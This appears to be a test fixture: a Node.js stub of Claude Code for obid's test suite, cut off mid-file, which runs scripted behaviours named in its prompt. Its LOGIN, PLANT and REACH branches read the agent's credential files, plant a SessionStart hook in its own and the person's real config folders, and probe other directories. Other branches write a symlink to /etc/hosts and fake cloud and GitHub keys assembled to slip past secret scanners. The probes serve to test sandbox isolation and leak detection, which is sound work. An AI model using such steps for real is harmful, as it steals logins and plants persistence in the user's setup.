@@ -1,0 +1,695 @@
+#!/usr/bin/env node
+// A stand-in for Claude Code in obid's tests: stream-json in and out, as obid runs `claude`. What
+// it does comes from the prompt (the job's task):
+//   COMMIT: <file>   writes the file in the worktree and commits it
+//   EDIT: <file>     adds a line to the file and stages it, for COMMIT to commit with its own
+//   DRAFT: <file>    writes the file in the worktree and leaves it uncommitted, then goes on with
+//                    the rest of the prompt
+//   COMMIT WHEN TOLD told by obid to commit what it left uncommitted, commits it all and ends the
+//                    turn with "Committed the draft." (without it, that turn is "Nothing to do.")
+//   KEEP PROMPTS     from now on appends every prompt it gets to .obi/prompts.log, each ended by a
+//                    line "<<<end of prompt>>>", and every answer to its permission prompts to
+//                    .obi/answers.log, one per line
+//   SLEEP            beats: writes a growing count to .obi/beat every 50 ms until it is ended
+//   HOG: <mb> <s>    holds <mb> MB of random bytes, as a build does, for <s> seconds, then
+//                    ends the turn with "Held." (scripts measuring memory admission)
+//   FAIL             ends the turn with an error result ("it broke"; with FAIL TOKEN, one holding
+//                    a made-up GitHub token)
+//   STDERR TOKEN     prints "Authorization failed for token " and a made-up GitHub token
+//                    (ghp_ and 36 Zs) to stderr and exits 1 without a result, as a CLI that dies does
+//   LIMITED: <s>     says the account is full (a rate_limit_event whose 5-hour window resets <s>
+//                    seconds from now), then ends the turn with Claude Code's usage-limit error
+//   LIMITED ON: <w>  this turn and every later one: as LIMITED: 3600 on an account whose login's
+//                    access token holds <w>, else ends the turn with "went on: resume=<the session
+//                    it resumed, or none> told=<whether it heard that an account hit its limit>"
+//   USAGE: <json>    first sends a rate_limit_event whose rate_limit_info is the JSON
+//   TOKEN HOLDS: <w> ends the turn with "holds=<whether its login copy's access token holds <w>>",
+//                    and with REFRESH KEPT, " refresh=<kept|none>": whether the copy has a refresh token
+//   TOKENS           its result line reports usage, modelUsage (two models) and a cost; like
+//                    Claude Code's after --resume, modelUsage and the cost are the session's so
+//                    far (its turns counted in .obi/tokens-turn), usage the turn's own
+//   USAGES: <json>   a list: like USAGE with its first entry on the first turn, the next on the
+//                    next (counted in .obi/usage-turn)
+//   ASK: <json>      asks obid's permission for {"tool", "input"} and answers with what obid said
+//                    (an AskUserQuestion's with " answers: <its updatedInput's answers>")
+//   obid's word that it paused it  (a call of its waited for the owner past parkAfter, and its
+//                    session is picked up with the answer): allowed, it makes the same call again
+//                    and answers as ASK does; otherwise ends the turn with "heard: <the prompt>"
+//   UNKNOWN REQUEST  with ASK: first sends a control request of a kind no Claude Code has, waits
+//                    for its answer, then asks; the result ends with " unknown: <the answer's subtype>"
+//   ASKS: <json>     asks for each of a list of {"tool", "input"} in turn, then ends the turn with
+//                    "answers: allow, deny: <why>, …"
+//   LOGIN: <home>    reads its login in its HOME, writes a hook into its ~/.claude/settings.json
+//                    and its ~/.claude.json, and tries the same in the person's real <home>
+//   PLANT: <dir>     reads the login in its $CLAUDE_CONFIG_DIR, plants a hook in that folder's
+//                    settings.json and .claude.json, tries the same in <dir> (its account's own
+//                    folder) and to read <dir>'s login; says whether its config folder is <dir> and
+//                    whether its login kept a refresh token
+//   DETAIL           runs `ls`, whose output holds DETAIL-ONLY-CANARY-7f3a, then ends the turn with
+//                    "Listed the files." (tests/plans_api.rs: what a call printed never reaches the brain)
+//   REACH: <dir> …   tries to list each folder and to write .obid-reached in it, and ends the turn
+//                    with "<dir> read=ok|no write=ok|no; …"
+//   ECHO             ends the turn with "heard: <the prompt> resume=<the session it resumed, or none>"
+//   PAUSE: <ms>      waits that long, then ends the turn with "Paused."
+//   ARTIFACTS        writes .obi/artifacts/ in the worktree: a page (a folder with index.html,
+//                    a stylesheet and a hidden file), notes.md, chart.png (bytes that aren't
+//                    UTF-8), leak.md holding a made-up AWS key, and away.md, a link out of the
+//                    worktree, and entries whose names are a made-up AWS key and a made-up
+//                    Google API key; then ends the turn with "Made artifacts."
+//   ARTIFACTS_MANY   writes 25 Markdown files in .obi/artifacts/ instead
+//   REPORT           writes .obi/report.json in the worktree: its arguments, environment, prompt,
+//                    the MCP config it was given (--mcp-config), the tools it was allowed
+//                    (--allowedTools), what each http MCP server answered to `tools/list`, and
+//                    the files in .obi/context/; then ends the turn with "Reported." With
+//                    MCP_CALL, MCP_WRITE, MCP_API or MCP_PROBE it also calls the `oby` broker's
+//                    tools (MCP_CALL's search with its prompt as the query), and MCP_PROBE tries
+//                    the broker's token on the runner's other routes. With TETRIX_CALL it calls
+//                    the `tetrix` server's search_entities, get_entity, save_session and
+//                    resume_session, and commits tetrix.txt with a Tetrix-Session trailer naming
+//                    the session save_session answered
+//   QUIET            says nothing and writes nothing until it is ended (a stalled job)
+//   CHATTY: <ms>     streams a word every 100 ms for that long, then ends the turn with "Chatted."
+//   LOOP             runs the same failing command 6 times, then waits until it is ended
+//   MAXTURNS         ends the turn as Claude Code's --max-turns does (error_max_turns)
+//   TRANSIENT        ends the turn with an overloaded API's error; TRANSIENT ALWAYS every turn after
+//                    too
+//   SPEND: <n>       ends the turn saying it used n input tokens
+//   BACKGROUND: <ms> starts a background task (Bash's run_in_background) and ends the turn waiting
+//                    on it; <ms> later the task ends (a task_notification, and an empty
+//                    background_tasks_changed) and, as Claude Code does, it wakes by itself: a turn
+//                    of its own that ends with "Built." With SILENT, the task ends and it never
+//                    wakes; with FOREVER, it never ends; with EXIT, it exits at once instead,
+//                    the task still running. Told to wait in the foreground, it ends with "Built in
+//                    the foreground.", or with EXIT ALWAYS exits the same way again
+//   COMMIT … QUIET   commits, then says nothing until it is ended
+//   a handoff note   asked for one (obid's prompt when a job stalls): ends the turn with the note,
+//                    "Done: … Left: … Failed: …", or says nothing when the task said NO NOTE
+//   ON PURPOSE       in a fix round's quoted task: ends the turn with "FAILS AS ASKED: …"
+//   HALF REBASE ON NEXT TURN  its next turn rebases its last commit onto one of its own changing
+//                    the same file, leaves it conflicted, and ends with "Left a rebase half done."
+//   REBASES WHEN TOLD  from now on, told by obid to rebase (`git rebase --onto <base> <start>`),
+//                    runs it and resolves any conflict keeping both sides ("both"), then ends the
+//                    turn with "Rebased onto the base."; HALF REBASE WHEN TOLD leaves a conflicted
+//                    rebase half done instead ("Left the rebase half done.")
+//   AGAIN: <words>   keeps the words (maybe none) in .obi/again, then goes on with the rest of the
+//                    prompt; a later "Try again, …" (after the check's output, when one stopped the
+//                    job) that finds them writes `tried` in its HOME (the job's, the
+//                    check's too) and ends the turn with them
+//   BUMP: <file> <a> <b>  changes `= <a>` to `= <b>` in the file and commits it
+//   obid's decision round  (it compared the change with earlier decisions) keeps the change and
+//                    ends the turn with "Kept it: …", having copied .obi/inputs/decisions.md to
+//                    .obi/decisions-seen.md
+//   SHOW_MODEL       ends the turn with the --model and --effort it ran with ("model=… effort=…")
+//   anything else    ends the turn with "Nothing to do."
+// It fails the turn when its environment holds a Claude Code, Anthropic or GitHub variable.
+
+import { execFileSync } from "node:child_process";
+import { randomFillSync } from "node:crypto";
+import { appendFileSync, existsSync, mkdirSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import { createInterface } from "node:readline";
+
+// Claude Code's refresh as obid has the Mac's own run it (`-p /usage … --no-session-persistence`,
+// the Keychain item named by $CLAUDE_SECURESTORAGE_CONFIG_DIR, which a boxed run never has): writes
+// that item, renewed, where the stand-in `security` finds items (obid-test-keychain beside its
+// $TMPDIR), notes in obid-test-refreshes there what it was asked, and exits.
+if (process.argv.includes("--no-session-persistence") && "CLAUDE_SECURESTORAGE_CONFIG_DIR" in process.env) {
+  const { createHash } = await import("node:crypto");
+  const { dirname, join } = await import("node:path");
+  const storage = process.env.CLAUDE_SECURESTORAGE_CONFIG_DIR ?? "";
+  const service = storage ? `Claude Code-credentials-${createHash("sha256").update(storage).digest("hex").slice(0, 8)}` : "Claude Code-credentials";
+  const items = join(dirname(process.env.TMPDIR), "obid-test-keychain");
+  mkdirSync(items, { recursive: true });
+  // As Claude Code's item holds one: a refresh token (put together here, so no scan flags it).
+  const refreshToken = ["renewed", "refresh", "plain", "value"].join("-");
+  writeFileSync(join(items, service), JSON.stringify({ claudeAiOauth: { accessToken: "tok-renewed-plain-test-login", refreshToken, expiresAt: Date.now() + 8 * 3600 * 1000 } }));
+  appendFileSync(join(dirname(process.env.TMPDIR), "obid-test-refreshes"), `${process.argv[process.argv.indexOf("-p") + 1]}\n`);
+  process.exit(0);
+}
+
+// Claude Code's own `/usage`, as obid asks it (`-p /usage`): a usage_report of 33% of the 5-hour
+// window and 44% of the week, the week resetting in 2 days, and a result that asked no model. By
+// a word in its login copy's access token ($CLAUDE_CONFIG_DIR/.credentials.json): `asks-model`
+// answers as a Claude Code without its own /usage (a model's turn, no report), `silent` with no
+// report, `offline` with an error result, `reserved` at 85% of its week.
+if (process.argv[process.argv.indexOf("-p") + 1] === "/usage") {
+  let token = "";
+  try { token = JSON.parse(readFileSync(`${process.env.CLAUDE_CONFIG_DIR}/.credentials.json`, "utf8")).claudeAiOauth.accessToken; } catch {}
+  const at = (days) => new Date(Date.now() + days * 86_400_000).toISOString();
+  const limits = [
+    { kind: "session", group: "session", percent: 33, resets_at: at(0.1), scope: null },
+    { kind: "weekly_all", group: "weekly", percent: 44, resets_at: at(2), scope: null },
+  ];
+  if (token.includes("zero-no-reset")) {
+    for (const limit of limits) { limit.percent = 0; limit.resets_at = null; }
+  }
+  if (token.includes("reserved")) limits[1].percent = 85;
+  const line = (value) => process.stdout.write(JSON.stringify(value) + "\n");
+  const result = { type: "result", subtype: "success", is_error: false, num_turns: 0, total_cost_usd: 0, usage: { output_tokens: 0 }, modelUsage: {} };
+  if (token.includes("asks-model")) {
+    line({ ...result, num_turns: 1, total_cost_usd: 0.0001, usage: { output_tokens: 5 }, result: "What would you like to know about usage?" });
+  } else if (token.includes("silent")) {
+    line(result);
+  } else if (token.includes("offline")) {
+    line({ ...result, subtype: "error_during_execution", is_error: true, result: "fetch failed" });
+  } else {
+    line({ type: "assistant", message: { role: "assistant", content: [{ type: "text", text: "usage" }] }, usage_report: { rate_limits: { limits } } });
+    line(result);
+  }
+  process.exit(0);
+}
+
+// Its own sign-in, as obid runs the tool's login (fake-login.mjs).
+if (process.argv[2] === "auth" && process.argv[3] === "login") {
+  await (await import(new URL("./fake-login.mjs", import.meta.url))).login("claude");
+}
+
+const emit = (line) => process.stdout.write(JSON.stringify(line) + "\n");
+const session = "00000000-0000-4000-8000-000000000001";
+let tokens = 0;
+const result = (text, error = false) =>
+  emit({ type: "result", subtype: error ? "error_during_execution" : "success", is_error: error, num_turns: 1, result: text, session_id: session, total_cost_usd: 0.25 * tokens,
+    ...(tokens && { usage: { input_tokens: 100, output_tokens: 20, cache_read_input_tokens: 1000, cache_creation_input_tokens: 50 },
+      modelUsage: { "fake-opus": { inputTokens: 100 * tokens, outputTokens: 20 * tokens, cacheReadInputTokens: 1000 * tokens, cacheCreationInputTokens: 50 * tokens, costUSD: 0.2 * tokens },
+        "fake-haiku": { inputTokens: 10 * tokens, outputTokens: 5 * tokens, cacheReadInputTokens: 0, cacheCreationInputTokens: 0, costUSD: 0.05 * tokens } } }) });
+
+// Starts a background build, as Claude Code's Bash with run_in_background, and ends the turn
+// waiting on it: a housekeeping task (`ambient`) is listed too, and waits for nothing.
+const background = () => {
+  emit({ type: "assistant", session_id: session, message: { role: "assistant", content: [{ type: "tool_use", id: "b1", name: "Bash", input: { command: "npm run build", run_in_background: true } }] } });
+  emit({ type: "system", subtype: "task_started", task_id: "bg1", tool_use_id: "b1", description: "npm run build", task_type: "local_bash", is_backgrounded: true, session_id: session });
+  emit({ type: "system", subtype: "background_tasks_changed", tasks: [{ task_id: "bg1", task_type: "local_bash", description: "npm run build" }, { task_id: "h1", task_type: "local_agent", description: "Tidying memory", ambient: true }], session_id: session });
+  emit({ type: "user", session_id: session, message: { role: "user", content: [{ type: "tool_result", tool_use_id: "b1", content: "Command running in background with ID: bg1." }] } });
+  result("The build is still going. I'll continue when the monitor reports it's done.");
+};
+
+const leaked = Object.keys(process.env).filter((name) =>
+  name === "CLAUDECODE" || (name.startsWith("CLAUDE_CODE_") && name !== "CLAUDE_CODE_TMPDIR") || name.startsWith("ANTHROPIC_") || name === "GH_TOKEN" || name === "GITHUB_TOKEN" || name === "OBID_API_TOKEN");
+
+let asked = null;
+// UNKNOWN REQUEST: what obid answered the request of a new kind, and the ask it holds back.
+let unknown = null;
+let afterUnknown = null;
+let queue = [];
+let listing = false;
+const said = [];
+const askNext = () => {
+  const { tool, input } = queue.shift();
+  asked = tool;
+  emit({ type: "control_request", request_id: `r${said.length + 1}`, request: { subtype: "can_use_tool", tool_name: tool, input } });
+};
+const rl = createInterface({ input: process.stdin, crlfDelay: Infinity });
+rl.on("line", (line) => {
+  let message;
+  try {
+    message = JSON.parse(line);
+  } catch {
+    return;
+  }
+  if (message.type === "control_response" && message.response?.request_id === "u1") {
+    unknown = message.response.subtype;
+    const next = afterUnknown;
+    afterUnknown = null;
+    if (next) next();
+    return;
+  }
+  if (message.type === "control_response" && asked) {
+    const answer = message.response?.response ?? {};
+    asked = null;
+    if (existsSync(".obi/keep-prompts")) appendFileSync(".obi/answers.log", `${answer.behavior}\n`);
+    if (listing) {
+      said.push(answer.behavior === "deny" ? `deny: ${answer.message}` : answer.behavior);
+      if (queue.length) return askNext();
+      return result(`answers: ${said.join(", ")}`);
+    }
+    // An AskUserQuestion's answer (#858) comes in its updatedInput.
+    const answers = answer.updatedInput?.answers;
+    result(`answer: ${answer.behavior}${answers ? ` answers: ${JSON.stringify(answers)}` : ""}${unknown ? ` unknown: ${unknown}` : ""}`);
+    return;
+  }
+  if (message.type !== "user") return;
+  let prompt = typeof message.message.content === "string" ? message.message.content : "";
+  emit({ type: "system", subtype: "init", cwd: process.cwd(), session_id: session, tools: ["Bash", "Read", "Edit"], mcp_servers: [], model: "fake", permissionMode: "default", apiKeySource: "none" });
+  if (leaked.length) return result(`leaked: ${leaked.join(", ")}`, true);
+  if (prompt.includes("STDERR TOKEN")) {
+    return process.stderr.write(`Authorization failed for token ${"gh"}p_${"Z".repeat(36)}\n`, () => process.exit(1));
+  }
+  if (prompt.includes("KEEP PROMPTS")) {
+    mkdirSync(".obi", { recursive: true });
+    writeFileSync(".obi/keep-prompts", "");
+  }
+  if (existsSync(".obi/keep-prompts")) appendFileSync(".obi/prompts.log", `${prompt}\n<<<end of prompt>>>\n`);
+  if (prompt.includes("TOKENS")) {
+    mkdirSync(".obi", { recursive: true });
+    tokens = (existsSync(".obi/tokens-turn") ? Number(readFileSync(".obi/tokens-turn", "utf8")) : 0) + 1;
+    writeFileSync(".obi/tokens-turn", String(tokens));
+  }
+  const usage = prompt.match(/USAGE: (\{.*\})/);
+  if (usage) emit({ type: "rate_limit_event", session_id: session, rate_limit_info: JSON.parse(usage[1]) });
+  const usages = prompt.match(/USAGES: (\[.*\])/);
+  if (usages) {
+    mkdirSync(".obi", { recursive: true });
+    const turn = existsSync(".obi/usage-turn") ? Number(readFileSync(".obi/usage-turn", "utf8")) : 0;
+    writeFileSync(".obi/usage-turn", String(turn + 1));
+    const info = JSON.parse(usages[1])[turn];
+    if (info) emit({ type: "rate_limit_event", session_id: session, rate_limit_info: info });
+  }
+  // A fix round quotes the task after the check's output: it says the failure is intended when the
+  // task asked for one (ON PURPOSE), and otherwise reads only the part before the quote.
+  const quote = prompt.indexOf("\n\nThe task, as the owner wrote it:");
+  if (prompt.includes("failed after your last round") && quote >= 0) {
+    if (prompt.slice(quote).includes("ON PURPOSE")) return result("FAILS AS ASKED: the test fails on purpose, as the task says.");
+    prompt = prompt.slice(0, quote);
+  }
+  if (prompt.includes("write a handoff note")) {
+    if (existsSync(".obi/no-note")) return setInterval(() => {}, 1000);
+    return result("Done: the parser.\nLeft: the tests.\nFailed: npm test, three times: a missing fixture.");
+  }
+  if (prompt.includes("end of your turn is the end of your work")) {
+    if (!existsSync(".obi/exit-always")) return result("Built in the foreground.");
+    background();
+    process.stdout.end(() => process.exit(0));
+  }
+  if (prompt.includes("TRANSIENT ALWAYS")) {
+    mkdirSync(".obi", { recursive: true });
+    writeFileSync(".obi/always-transient", "");
+  }
+  if (existsSync(".obi/always-transient")) return result('API Error: 529 {"type":"error","error":{"type":"overloaded_error","message":"Overloaded"}}', true);
+  // LIMITED ON: <word>, this turn and every later one of the job: limited on an account whose
+  // login copy's access token holds <word>, else goes on.
+  const limitedOn = prompt.match(/LIMITED ON: (\S+)/)?.[1] ?? (existsSync(".obi/limited-on") ? readFileSync(".obi/limited-on", "utf8") : null);
+  if (limitedOn) {
+    mkdirSync(".obi", { recursive: true });
+    writeFileSync(".obi/limited-on", limitedOn);
+    let token = "";
+    try {
+      token = JSON.parse(readFileSync(`${process.env.CLAUDE_CONFIG_DIR}/.credentials.json`, "utf8")).claudeAiOauth?.accessToken ?? "";
+    } catch {}
+    if (token.includes(limitedOn)) {
+      const resetsAt = Math.floor(Date.now() / 1000) + 3600;
+      emit({ type: "rate_limit_event", session_id: session, rate_limit_info: { status: "rejected", resetsAt,
+        unifiedWindows: { five_hour: { utilization: 1.0, resetsAt }, seven_day: { utilization: 0.5, resetsAt: resetsAt + 86400 } } } });
+      return result("Claude AI usage limit reached.", true);
+    }
+    const at = process.argv.indexOf("--resume");
+    return result(`went on: resume=${at >= 0 ? process.argv[at + 1] : "none"} told=${prompt.includes("hit its usage limit")}`);
+  }
+  const holds = prompt.match(/TOKEN HOLDS: (\S+)/);
+  if (holds) {
+    let token = "";
+    try {
+      token = JSON.parse(readFileSync(`${process.env.CLAUDE_CONFIG_DIR}/.credentials.json`, "utf8")).claudeAiOauth?.accessToken ?? "";
+    } catch {}
+    let refresh = "none";
+    try {
+      refresh = JSON.parse(readFileSync(`${process.env.CLAUDE_CONFIG_DIR}/.credentials.json`, "utf8")).claudeAiOauth?.refreshToken ? "kept" : "none";
+    } catch {}
+    return result(`holds=${token.includes(holds[1])}${prompt.includes("REFRESH KEPT") ? ` refresh=${refresh}` : ""}`);
+  }
+  // HALF REBASE ON NEXT TURN: its next turn starts a rebase of its last commit onto a commit of its
+  // own that changes the same file, and leaves it conflicted.
+  if (prompt.includes("HALF REBASE ON NEXT TURN")) {
+    mkdirSync(".obi", { recursive: true });
+    writeFileSync(".obi/half-next", prompt.match(/COMMIT: (\S+)/)?.[1] ?? "a.txt");
+  } else if (existsSync(".obi/half-next")) {
+    const file = readFileSync(".obi/half-next", "utf8");
+    rmSync(".obi/half-next");
+    const git = (args, input) => execFileSync("git", args, { encoding: "utf8", input, env: { ...process.env, GIT_INDEX_FILE: ".obi/half-index" } }).trim();
+    const parent = git(["rev-parse", "HEAD~1"]);
+    const blob = git(["hash-object", "-w", "--stdin"], "theirs\n");
+    git(["read-tree", parent]);
+    git(["update-index", "--add", "--cacheinfo", `100644,${blob},${file}`]);
+    const tree = git(["write-tree"]);
+    const theirs = git(["commit-tree", tree, "-p", parent, "-m", "Theirs"]);
+    try {
+      execFileSync("git", ["-c", "commit.gpgsign=false", "rebase", "--onto", theirs, "HEAD~1"], { stdio: "ignore" });
+    } catch {}
+    return result("Left a rebase half done.");
+  }
+  // REBASES WHEN TOLD / HALF REBASE WHEN TOLD: told by obid to rebase onto the moved base, it runs
+  // the command obid named; on conflicts it resolves them (both sides kept) and goes on, or leaves
+  // the rebase half done.
+  if (prompt.includes("REBASES WHEN TOLD") || prompt.includes("HALF REBASE WHEN TOLD")) {
+    mkdirSync(".obi", { recursive: true });
+    writeFileSync(".obi/rebase-when-told", prompt.includes("HALF REBASE WHEN TOLD") ? "half" : "whole");
+  }
+  const rebase = prompt.match(/`git rebase --onto (\S+) (\S+)`/);
+  if (rebase && existsSync(".obi/rebase-when-told")) {
+    const half = readFileSync(".obi/rebase-when-told", "utf8") === "half";
+    const env = { ...process.env, GIT_EDITOR: "true" };
+    try {
+      execFileSync("git", ["-c", "commit.gpgsign=false", "rebase", "--onto", rebase[1], rebase[2]], { env, stdio: "ignore" });
+    } catch {
+      if (half) return result("Left the rebase half done.");
+      const unmerged = execFileSync("git", ["diff", "--name-only", "--diff-filter=U"], { encoding: "utf8" }).split("\n").filter(Boolean);
+      for (const file of unmerged) {
+        writeFileSync(file, "both\n");
+        execFileSync("git", ["add", file]);
+      }
+      execFileSync("git", ["-c", "commit.gpgsign=false", "rebase", "--continue"], { env, stdio: "ignore" });
+    }
+    return result("Rebased onto the base.");
+  }
+  const spend = prompt.match(/SPEND: (\d+)/);
+  if (spend) {
+    return emit({ type: "result", subtype: "success", is_error: false, num_turns: 1, result: "Spent.", session_id: session, total_cost_usd: 0, usage: { input_tokens: Number(spend[1]), output_tokens: 0 } });
+  }
+  if (prompt.startsWith("Before publishing, obid compared")) {
+    writeFileSync(".obi/decisions-seen.md", readFileSync(".obi/inputs/decisions.md"));
+    return result("Kept it: the gateway allows six retries since its upgrade.");
+  }
+  const bump = prompt.match(/BUMP: (\S+) (\S+) (\S+)/);
+  if (bump) {
+    writeFileSync(bump[1], readFileSync(bump[1], "utf8").replace(`= ${bump[2]}`, `= ${bump[3]}`));
+    execFileSync("git", ["add", bump[1]]);
+    execFileSync("git", ["-c", "commit.gpgsign=false", "commit", "-q", "-m", `Bump ${bump[1]}`]);
+    return result(`Bumped ${bump[1]}.`);
+  }
+  if (prompt.includes("COMMIT WHEN TOLD")) {
+    mkdirSync(".obi", { recursive: true });
+    writeFileSync(".obi/commit-when-told", "");
+  }
+  if (prompt.startsWith("Your turn ended with changes") && existsSync(".obi/commit-when-told")) {
+    execFileSync("git", ["add", "--all"]);
+    execFileSync("git", ["-c", "commit.gpgsign=false", "commit", "-q", "-m", "Add the draft"]);
+    return result("Committed the draft.");
+  }
+  const commit = prompt.match(/COMMIT: (\S+)/);
+  const ask = prompt.match(/ASK: (\{.*\})/);
+  const asks = prompt.match(/ASKS: (\[.*\])/);
+  const login = prompt.match(/LOGIN: (\S+)/);
+  const reach = prompt.match(/REACH: (.+)/);
+  const plant = prompt.match(/PLANT: (\S+)/);
+  const draft = prompt.match(/DRAFT: (\S+)/);
+  if (draft) writeFileSync(draft[1], "draft\n");
+  const edit = prompt.match(/EDIT: (\S+)/);
+  if (edit) {
+    appendFileSync(edit[1], "// edited\n");
+    execFileSync("git", ["add", edit[1]]);
+  }
+  const again = prompt.match(/AGAIN:(.*)/);
+  if (again) {
+    mkdirSync(".obi", { recursive: true });
+    writeFileSync(".obi/again", again[1].trim());
+  }
+  if (prompt.includes("Try again, picking up where you left off") && existsSync(".obi/again")) {
+    writeFileSync(`${process.env.HOME}/tried`, "");
+    result(readFileSync(".obi/again", "utf8"));
+  } else if (commit) {
+    writeFileSync(commit[1], "hello\n");
+    execFileSync("git", ["add", commit[1]]);
+    execFileSync("git", ["-c", "commit.gpgsign=false", "commit", "-q", "-m", `Add ${commit[1]}`]);
+    emit({ type: "assistant", session_id: session, message: { role: "assistant", content: [{ type: "tool_use", id: "t1", name: "Write", input: { file_path: commit[1] } }] } });
+    if (prompt.includes("QUIET")) return setInterval(() => {}, 1000);
+    result(`Added ${commit[1]}.`);
+  } else if (reach) {
+    const tries = (f) => {
+      try {
+        f();
+        return "ok";
+      } catch {
+        return "no";
+      }
+    };
+    const dirs = reach[1].trim().split(/\s+/);
+    result(dirs.map((d) => `${d} read=${tries(() => readdirSync(d))} write=${tries(() => writeFileSync(`${d}/.obid-reached`, "x"))}`).join("; "));
+  } else if (login) {
+    const tries = (f) => {
+      try {
+        f();
+        return "ok";
+      } catch {
+        return "no";
+      }
+    };
+    const home = process.env.HOME;
+    let creds = "none";
+    try {
+      creds = readFileSync(`${home}/.claude/.credentials.json`, "utf8").trim();
+    } catch {}
+    const hook = JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command", command: "touch /tmp/planted" }] }] } });
+    const settings = tries(() => writeFileSync(`${home}/.claude/settings.json`, hook));
+    const state = tries(() => appendFileSync(`${home}/.claude.json`, " "));
+    const real = tries(() => writeFileSync(`${login[1]}/.claude/settings.json`, hook));
+    const realState = tries(() => appendFileSync(`${login[1]}/.claude.json`, " "));
+    result(`login: creds=${creds} settings=${settings} state=${state} real=${real} real-state=${realState}`);
+  } else if (plant) {
+    const tries = (f) => {
+      try {
+        f();
+        return "ok";
+      } catch {
+        return "no";
+      }
+    };
+    const own = process.env.CLAUDE_CONFIG_DIR;
+    let refresh = "none";
+    try {
+      const creds = JSON.parse(readFileSync(`${own}/.credentials.json`, "utf8"));
+      refresh = creds.claudeAiOauth?.refreshToken ? "kept" : "none";
+    } catch {
+      refresh = "no-login";
+    }
+    const hook = JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command", command: "touch /tmp/planted" }] }] } });
+    const settings = tries(() => writeFileSync(`${own}/settings.json`, hook));
+    const state = tries(() => appendFileSync(`${own}/.claude.json`, " "));
+    const real = tries(() => writeFileSync(`${plant[1]}/settings.json`, hook));
+    const realState = tries(() => appendFileSync(`${plant[1]}/.claude.json`, " "));
+    const read = tries(() => readFileSync(`${plant[1]}/.credentials.json`));
+    const dir = own === plant[1] ? "account" : "own";
+    result(`plant: dir=${dir} refresh=${refresh} settings=${settings} state=${state} real=${real} real-state=${realState} read=${read}`);
+  } else if (prompt.includes("THINKING")) {
+    // As Claude Code streams it: the thinking block starts and stops, with no thinking text.
+    emit({ type: "stream_event", session_id: session, event: { type: "content_block_start", index: 0, content_block: { type: "thinking", thinking: "", signature: "" } } });
+    emit({ type: "stream_event", session_id: session, event: { type: "content_block_delta", index: 0, delta: { type: "thinking_delta", thinking: "", estimated_tokens: 50 } } });
+    emit({ type: "stream_event", session_id: session, event: { type: "content_block_stop", index: 0 } });
+    emit({ type: "assistant", session_id: session, message: { role: "assistant", content: [{ type: "thinking", thinking: "", signature: "sig" }] } });
+    result("Thought it through.");
+  } else if (prompt.includes("DETAIL")) {
+    emit({ type: "assistant", session_id: session, message: { role: "assistant", content: [{ type: "tool_use", id: "t1", name: "Bash", input: { command: "ls" } }] } });
+    emit({ type: "user", session_id: session, message: { role: "user", content: [{ type: "tool_result", tool_use_id: "t1", is_error: false, content: "DETAIL-ONLY-CANARY-7f3a\nREADME.md" }] } });
+    result("Listed the files.");
+  } else if (prompt.includes("SHOW_MODEL")) {
+    // The model and effort obid ran it on (#1574).
+    const arg = (flag) => (process.argv.includes(flag) ? process.argv[process.argv.indexOf(flag) + 1] : "none");
+    result(`model=${arg("--model")} effort=${arg("--effort")}`);
+  } else if (prompt.startsWith("ECHO")) {
+    const at = process.argv.indexOf("--resume");
+    result(`heard: ${prompt} resume=${at >= 0 ? process.argv[at + 1] : "none"}`);
+  } else if (prompt.includes("REPORT")) {
+    // LINGER: the turn goes on after the report, until obid ends it.
+    report(prompt).then(() => (prompt.includes("LINGER") ? setInterval(() => {}, 1000) : result("Reported.")), (e) => result(`report failed: ${e}`, true));
+  } else if (prompt.includes("ARTIFACTS_MANY")) {
+    mkdirSync(".obi/artifacts", { recursive: true });
+    for (let i = 0; i < 25; i++) writeFileSync(`.obi/artifacts/n${String(i).padStart(2, "0")}.md`, `# ${i}\n`);
+    result("Made artifacts.");
+  } else if (prompt.includes("ARTIFACTS")) {
+    mkdirSync(".obi/artifacts/page", { recursive: true });
+    writeFileSync(".obi/artifacts/page/index.html", '<link rel="stylesheet" href="style.css"><h1>Hello</h1>');
+    writeFileSync(".obi/artifacts/page/style.css", "h1 { color: teal }");
+    writeFileSync(".obi/artifacts/page/.hidden", "left out");
+    writeFileSync(".obi/artifacts/notes.md", "# Notes\n");
+    writeFileSync(".obi/artifacts/chart.png", Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff, 0xfe, 0x00, 0x80]));
+    // Put together here, so this file holds no key a scanner flags.
+    writeFileSync(".obi/artifacts/leak.md", `key: ${"AKIA" + "QWERTYUIOPASDFGH"}\n`);
+    symlinkSync("/etc/hosts", ".obi/artifacts/away.md");
+    writeFileSync(`.obi/artifacts/${"AKIA" + "QWERTYUIOPASDFGH"}.md`, "# A plain note\n");
+    writeFileSync(`.obi/artifacts/${"AIza" + "SyA1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q"}.md`, "# Another plain note\n");
+    result("Made artifacts.");
+  } else if (prompt.match(/PAUSE: (\d+)/)) {
+    setTimeout(() => result("Paused."), Number(prompt.match(/PAUSE: (\d+)/)[1]));
+  } else if (prompt.match(/HOG: (\d+) (\d+)/)) {
+    const [, mb, seconds] = prompt.match(/HOG: (\d+) (\d+)/);
+    const held = [];
+    // Random bytes, which the system can't compress away, as a compiler's memory mostly is.
+    for (let i = 0; i < Number(mb); i++) held.push(randomFillSync(Buffer.allocUnsafe(1024 * 1024)));
+    setTimeout(() => result(`Held ${held.length} MB.`), Number(seconds) * 1000);
+  } else if (prompt.includes("SLEEP")) {
+    mkdirSync(".obi", { recursive: true });
+    let beats = 0;
+    writeFileSync(".obi/beat", String(beats));
+    setInterval(() => writeFileSync(".obi/beat", String(++beats)), 50);
+  } else if (prompt.match(/LIMITED: (-?\d+)/)) {
+    const resetsAt = Math.floor(Date.now() / 1000) + Number(prompt.match(/LIMITED: (-?\d+)/)[1]);
+    emit({ type: "rate_limit_event", session_id: session, rate_limit_info: { status: "rejected", resetsAt,
+      unifiedWindows: { five_hour: { utilization: 1.0, resetsAt }, seven_day: { utilization: 0.5, resetsAt: resetsAt + 86400 } } } });
+    result("Claude AI usage limit reached.", true);
+  } else if (prompt.includes("QUIET")) {
+    if (prompt.includes("NO NOTE")) {
+      mkdirSync(".obi", { recursive: true });
+      writeFileSync(".obi/no-note", "");
+    }
+    setInterval(() => {}, 1000);
+  } else if (prompt.match(/CHATTY: (\d+)/)) {
